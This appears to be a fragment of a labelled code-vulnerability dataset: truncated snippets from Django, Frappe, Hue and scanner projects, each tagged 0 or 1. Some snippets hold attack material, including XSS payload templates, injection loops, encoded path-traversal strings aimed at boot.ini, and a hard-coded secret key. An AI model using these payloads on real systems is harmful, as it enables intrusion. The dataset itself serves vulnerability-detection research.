\t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t\t\t \t\tp[serv].line(\"Date\", \"curr_con\", source=source", "label": 0}, {"snippet_id": 52927, "code": " }) @check_document_access_permission() def edit_coordinator(request): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator", "label": 0}, {"snippet_id": 34700, "code": "\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":", "label": 0}, {"snippet_id": 52540, "code": ".get_fields()) _properties.update(dict([(_property['name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response[", "label": 0}, {"snippet_id": 49980, "code": ".task import LoopingCall from django.utils.functional import Promise from django.utils.encoding import force_unicode from django.conf import settings from evennia.utils.ansi import parse_ansi from evennia", "label": 0}, {"snippet_id": 14704, "code": "='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name", "label": 0}, {"snippet_id": 41889, "code": " filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key", "label": 0}, {"snippet_id": 22956, "code": "'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name", "label": 0}, {"snippet_id": 7464, "code": "\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback", "label": 0}, {"snippet_id": 18677, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes')", "label": 0}, {"snippet_id": 25873, "code": ".type==Question.TYPE_TIME: field=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None", "label": 0}, {"snippet_id": 49510, "code": " for choice in( (1, _('Yes')), (0, _('No')) ) ] elif issubclass(type(self.model_field), ForeignKey): pks=self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True) remote_field", "label": 0}, {"snippet_id": 33794, "code": "=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\":", "label": 1}, {"snippet_id": 21477, "code": "\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$", "label": 0}, {"snippet_id": 7598, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 47768, "code": " request: the HttpRequest :param default_forward_url: The URL to forward to if nothing was specified :return: The crafted HttpResponse \"\"\" forward_url=default_forward_url if request.GET.get(\"redirect\")", "label": 0}, {"snippet_id": 54321, "code": " payload=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main, values=[\"On\", \"Off\"]) global crawl crawl=ttk.Combobox", "label": 0}, {"snippet_id": 39836, "code": "(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.", "label": 0}, {"snippet_id": 6900, "code": " or similar on localhost that will proxy requests to a currently available backend using TLS. \"\"\" return self.config.get(self.section, 'vccs_url') @property def insecure_cookies(self): \"\"\" Set to True to", "label": 0}, {"snippet_id": 33965, "code": "\t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment", "label": 0}, {"snippet_id": 34510, "code": "('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself", "label": 0}, {"snippet_id": 47308, "code": "}, follow_redirects=True) assert res.status_code==200 res=client.get(detail_view_url) assert res.status_code==200 assert '<pre>null</pre>' in res.get_data(as_text=True) res=client.post( delete_view_url", "label": 0}, {"snippet_id": 40527, "code": "[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):", "label": 0}, {"snippet_id": 42023, "code": "\t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key", "label": 0}, {"snippet_id": 36490, "code": ", df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), ", "label": 0}, {"snippet_id": 21462, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$", "label": 0}, {"snippet_id": 34230, "code": "\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\"", "label": 0}, {"snippet_id": 355, "code": ") for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact", "label": 1}, {"snippet_id": 30539, "code": "('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act=", "label": 0}, {"snippet_id": 25266, "code": " value): if value is None: return None data=[] for i, field in enumerate(self.scheme['fields']): fname, label, size=field data.append(value.get(fname, \"\")) if '_legacy' in value and not data[-1]: data[", "label": 0}, {"snippet_id": 40921, "code": "\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak \treturn", "label": 0}, {"snippet_id": 1581, "code": ") @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)", "label": 0}, {"snippet_id": 51434, "code": " SECRET_KEY='_dzlo^9d DEBUG=True ALLOWED_HOSTS=[] INSTALLED_APPS=[ 'constance', 'constance.backends.database', 'jet.dashboard', 'jet', 'import_export', 'django.contrib.admin', 'django.contrib.auth', 'django", "label": 0}, {"snippet_id": 12984, "code": "[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root", "label": 0}, {"snippet_id": 21299, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*", "label": 1}, {"snippet_id": 4564, "code": "'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure", "label": 0}, {"snippet_id": 45217, "code": "(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) })", "label": 1}, {"snippet_id": 44030, "code": "\nfrom elasticsearch_dsl import FacetedSearch, TermsFacet from elasticsearch_dsl.query import SimpleQueryString, Bool class RTDFacetedSearch(FacetedSearch): \"\"\"Overwrite the initialization in order too meet", "label": 1}, {"snippet_id": 5892, "code": "<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return ", "label": 0}, {"snippet_id": 14172, "code": " +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ", "label": 0}, {"snippet_id": 23396, "code": ".MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns", "label": 0}, {"snippet_id": 13642, "code": " 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 25420, "code": "('max_length', None), } self.scheme_name=kwargs.pop('scheme') self.scheme=PERSON_NAME_SCHEMES.get(self.scheme_name) self.one_required=kwargs.get('required', True) require_all_fields=kwargs.pop('require_all_fields", "label": 0}, {"snippet_id": 38932, "code": "[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key", "label": 0}, {"snippet_id": 45430, "code": "=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) },", "label": 0}, {"snippet_id": 10971, "code": " self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"", "label": 0}, {"snippet_id": 19380, "code": "'', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit", "label": 0}, {"snippet_id": 47521, "code": ".email))) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect',", "label": 0}, {"snippet_id": 26820, "code": "%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems", "label": 0}, {"snippet_id": 39152, "code": ".doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid", "label": 0}, {"snippet_id": 24185, "code": ") self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls", "label": 0}, {"snippet_id": 43764, "code": ".meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide", "label": 0}, {"snippet_id": 41746, "code": " \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument", "label": 0}, {"snippet_id": 26090, "code": ".all_optional: self.initial['is_business']=True self.fields['is_business'].widget=BusinessBooleanRadio(require_business=True) self.fields['company'].required=True self.fields['company'].widget.is_required", "label": 0}, {"snippet_id": 52056, "code": ".content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }", "label": 1}, {"snippet_id": 53162, "code": " HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id))", "label": 0}, {"snippet_id": 52776, "code": ") job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))", "label": 0}, {"snippet_id": 13257, "code": "=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 9415, "code": "<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 3451, "code": ") result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[", "label": 0}, {"snippet_id": 15090, "code": ".get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir", "label": 0}, {"snippet_id": 19818, "code": " threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation", "label": 0}, {"snippet_id": 19725, "code": ": from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite", "label": 0}, {"snippet_id": 4100, "code": " api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,", "label": 0}, {"snippet_id": 11796, "code": "'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r", "label": 0}, {"snippet_id": 32894, "code": " self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'): bold=('<b>', '</b>') else: bold=('', '') self.wfile.write", "label": 0}, {"snippet_id": 52667, "code": " @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status", "label": 0}, {"snippet_id": 35341, "code": " links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links", "label": 0}, {"snippet_id": 21612, "code": "<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort", "label": 0}, {"snippet_id": 17423, "code": "'ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores')", "label": 0}, {"snippet_id": 19252, "code": " test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec", "label": 0}, {"snippet_id": 5943, "code": " % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event", "label": 0}, {"snippet_id": 31676, "code": "\tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('get_hap_v'): \toutput=funct.check_haproxy_version", "label": 0}, {"snippet_id": 30231, "code": ".get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \t \tpostdata={ \t\t'action': form.getvalue('action'),", "label": 0}, {"snippet_id": 51536, "code": ".XFrameOptionsMiddleware', 'django_otp.middleware.OTPMiddleware', ] ROOT_URLCONF='dashboard.urls' TEMPLATES=[ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS':[ BASE_DIR +'/', ], 'APP_DIRS':", "label": 0}, {"snippet_id": 17567, "code": ".contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 4681, "code": "'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin", "label": 0}, {"snippet_id": 37991, "code": " -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self", "label": 0}, {"snippet_id": 54575, "code": "() return context class RegisterFormView(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm success_url='/login/' def form_valid(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"", "label": 0}, {"snippet_id": 3034, "code": " logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def", "label": 0}, {"snippet_id": 40984, "code": "/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 17891, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url", "label": 0}, {"snippet_id": 28456, "code": "=get_config_var('main', 'log_path') \tlogin='' \t \tif not os.path.exists(log_path): \t\tos.makedirs(log_path) \t\t \ttry: \t\tIP=cgi.escape(os.environ[\"REMOTE_ADDR\"]) \t\tcookie=http.cookies.SimpleCookie(os.environ.get", "label": 0}, {"snippet_id": 45106, "code": " job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators", "label": 0}, {"snippet_id": 45908, "code": " from desktop.lib.django_util import JsonResponse, render from desktop.lib.exceptions_renderable import PopupException from desktop.models import Document2, Document from search.conf import LATEST from", "label": 0}, {"snippet_id": 28390, "code": " \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type):", "label": 0}, {"snippet_id": 11500, "code": " urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"", "label": 0}, {"snippet_id": 51479, "code": "', 'websecmap.pro', 'dashboard.internet_nl_dashboard', 'django_otp', 'django_otp.plugins.otp_static', 'django_otp.plugins.otp_totp', 'two_factor', ] try: if not os.environ.get('COMPRESS', False): import", "label": 0}, {"snippet_id": 12121, "code": ")/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 1}, {"snippet_id": 43980, "code": "\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval)", "label": 0}, {"snippet_id": 24868, "code": ". \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='", "label": 0}, {"snippet_id": 52905, "code": " job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators", "label": 0}, {"snippet_id": 41606, "code": " get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model", "label": 0}, {"snippet_id": 16743, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', ", "label": 1}, {"snippet_id": 31421, "code": "[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['curr_con'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size", "label": 0}, {"snippet_id": 49195, "code": "('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by", "label": 0}, {"snippet_id": 3543, "code": ".replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 31429, "code": "].y_range.start=0 \t\tp[serv].y_range.end=int(df['curr_con'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t\t\t \t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5", "label": 0}, {"snippet_id": 42262, "code": "\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t", "label": 0}, {"snippet_id": 34904, "code": "\"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self", "label": 0}, {"snippet_id": 43925, "code": "\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters", "label": 0}, {"snippet_id": 52944, "code": ".get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error", "label": 0}, {"snippet_id": 54945, "code": ") locale.aggregate_stats() for project in projects: project.aggregate_stats() ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats() def mark_changed_translation(changed_entities, locale", "label": 0}, {"snippet_id": 22279, "code": "]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset", "label": 0}, {"snippet_id": 9303, "code": "'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 17127, "code": ")/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications", "label": 0}, {"snippet_id": 49158, "code": ".column_id: new_query.append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params({ self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\"", "label": 0}, {"snippet_id": 34485, "code": "\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t", "label": 0}, {"snippet_id": 39122, "code": "\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in", "label": 0}, {"snippet_id": 349, "code": " param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if", "label": 1}, {"snippet_id": 16753, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P", "label": 1}, {"snippet_id": 20597, "code": " from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover", "label": 0}, {"snippet_id": 52687, "code": "']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow", "label": 0}, {"snippet_id": 31057, "code": "+x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip", "label": 0}, {"snippet_id": 19447, "code": " should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\"", "label": 0}, {"snippet_id": 27233, "code": " scan_for_forms(): Error \" +str(e) return def banner(): print \"BEstAutomaticXSSFinder v1.0\" print \"DISCLAIMER: For testing purposes only!\\n\" if __name__==\"__main__\": banner() if len(sys.argv) !=2: print \"program", "label": 1}, {"snippet_id": 2190, "code": ".headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload", "label": 0}, {"snippet_id": 40622, "code": " the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] 